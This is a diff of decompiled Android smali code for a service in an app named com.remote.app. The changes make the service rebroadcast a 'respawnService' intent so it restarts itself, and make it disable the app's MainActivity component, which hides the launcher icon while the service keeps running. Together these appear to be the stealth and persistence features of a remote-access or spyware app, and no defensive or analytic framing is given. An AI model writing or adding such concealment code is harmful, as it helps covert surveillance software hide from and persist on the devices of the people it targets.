@@ -127,15 +127,9 @@
 
     new-instance v0, Landroid/content/Intent;
 
-    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
+    const-string v1, "respawnService"
 
-    const-string v1, "RestartService"
-
-    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;
-
-    const-class v1, Lcom/remote/app/ServiceReciever;
-
-    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
+    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
 
     invoke-virtual {p0, v0}, Landroid/app/Service;->sendBroadcast(Landroid/content/Intent;)V
 
@@ -143,9 +137,25 @@
 .end method
 
 .method public onStartCommand(Landroid/content/Intent;II)I
-    .locals 0
+    .locals 1
 
     invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I
+
+    invoke-virtual {p0}, Landroid/app/Service;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object p1
+
+    new-instance p2, Landroid/content/ComponentName;
+
+    const-class p3, Lcom/remote/app/MainActivity;
+
+    invoke-direct {p2, p0, p3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    const/4 p3, 0x1
+
+    const/4 v0, 0x2
+
+    invoke-virtual {p1, p2, v0, p3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
 
     new-instance p1, Lcom/remote/app/j;
 
@@ -165,7 +175,5 @@
 
     invoke-static {p0}, Lcom/remote/app/e;->a(Landroid/content/Context;)V
 
-    const/4 p1, 0x1
-
-    return p1
+    return p3
 .end method
